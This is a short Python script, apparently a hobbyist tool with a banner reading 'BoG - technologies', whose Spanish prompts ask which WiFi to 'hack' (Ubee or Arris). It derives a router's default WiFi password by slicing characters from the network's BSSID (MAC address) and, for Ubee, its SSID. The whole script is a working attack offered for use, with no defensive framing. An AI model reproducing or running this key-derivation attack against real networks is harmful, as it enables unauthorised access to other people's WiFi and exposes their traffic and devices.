#Emilio Barroso
botrl = """
.--..----..---..---. 
|-< | || |`| |'| |-< 
`--'`----' `-' `-'`-'
                     
"""
print (botrl)
print ("BoG - technologies")
otsion = input("Wifi a hackear(1.ubee/2.Arris): ")
if otsion=="1":
  string = input("Mac(bssid): ")
  strong = input("Nombre de la Red(ssid):")[6:8]
  macs = string.replace(":","")[2:10]
  print("Password: " + macs + strong)
elif otsion=="2":
  string1 = input("Mac(bssid): ")
  macs1 = string1.replace(":","")[2:12]
  print("Password: " + macs1)
else:
  print("opcion no valida")
